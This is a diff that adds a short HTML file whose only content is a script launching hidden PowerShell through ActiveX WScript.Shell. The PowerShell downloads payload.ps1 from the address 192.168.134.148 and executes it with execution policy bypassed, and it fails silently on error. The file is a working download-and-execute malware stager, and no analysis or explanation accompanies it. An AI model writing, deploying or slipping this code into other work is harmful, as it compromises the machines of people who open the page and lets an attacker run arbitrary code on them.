@@ -1,0 +1,14 @@
+<html>
+<head>
+</head>
+<body>
+  <script>
+    var cmd = 'powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).DownloadString(\'http://192.168.134.148/payload.ps1\')"';
+    try {
+      new ActiveXObject("WScript.Shell").Run(cmd, 0 , true);
+    } catch(e){
+      //Silent fail
+    }
+      </script>
+</body>
+</html>
